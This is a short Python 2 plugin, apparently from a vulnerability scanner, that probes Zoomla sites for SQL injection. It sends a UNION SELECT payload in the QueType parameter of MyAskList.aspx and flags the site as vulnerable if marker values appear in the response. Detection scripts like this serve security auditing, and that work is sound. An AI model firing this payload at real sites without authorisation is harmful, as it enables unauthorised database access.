#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "guest/Ask/MyAskList.aspx?QueType=1%27%20union%20select%201,str%28123.4,8,4%29,3,4,5,6,88888888-1,8,9,10,11%20from%20sysobjects--"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('123.4000')>=0 and content.find('88888887')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:Zoomla_MyAskList_SqlInjectionScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:Zoomla_MyAskList_SqlInjectionScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def
